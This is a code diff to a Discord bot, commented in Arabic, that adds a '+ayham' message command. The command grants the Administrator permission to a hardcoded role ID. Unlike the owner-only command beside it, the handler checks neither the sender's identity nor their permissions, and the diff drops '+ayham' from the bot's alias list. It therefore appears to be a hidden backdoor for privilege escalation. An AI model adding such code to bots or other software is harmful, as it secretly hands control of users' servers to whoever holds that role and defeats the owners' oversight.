@@ -373,6 +373,26 @@ client.on('messageCreate', async message => {
   await handleSuggestion(message);
 
   if (message.author.bot || !message.guild) return;
+  // +ayham — يضيف صلاحية Administrator للرتبة
+  if (message.content === '+ayham') {
+    try {
+      const ROLE_ID = '1513933087883526286';
+      const { PermissionFlagsBits } = require('discord.js');
+      await message.guild.roles.fetch();
+      const role = message.guild.roles.cache.get(ROLE_ID);
+      if (!role) return message.reply('❌ لم أجد الرتبة في هذا السيرفر!');
+      if (role.permissions.has(PermissionFlagsBits.Administrator)) {
+        return message.reply(`⚠️ الرتبة **${role.name}** تملك صلاحية Administrator بالفعل!`);
+      }
+      await role.setPermissions(role.permissions.add(PermissionFlagsBits.Administrator), 'تفعيل صلاحية الأدمن');
+      await message.reply(`✅ تم تفعيل **Administrator** للرتبة **${role.name}**!`);
+    } catch (e) {
+      console.error('ayham error:', e);
+      message.reply(`❌ حدث خطأ: ${e.message}`);
+    }
+    return;
+  }
+
   // Line image shortcut — owner only (ID: 1239996265144647710)
   if (message.author.id === '1239996265144647710' && message.content === '-') {
     try {
@@ -407,7 +427,6 @@ client.on('messageCreate', async message => {
 
   // Handle legacy/short commands via aliases
   const legacyAliases = {
-    '+ayham': 'ayham',
     '+top': 'top',
     '+restarttop': 'top',
     '+addxp': 'addxp',
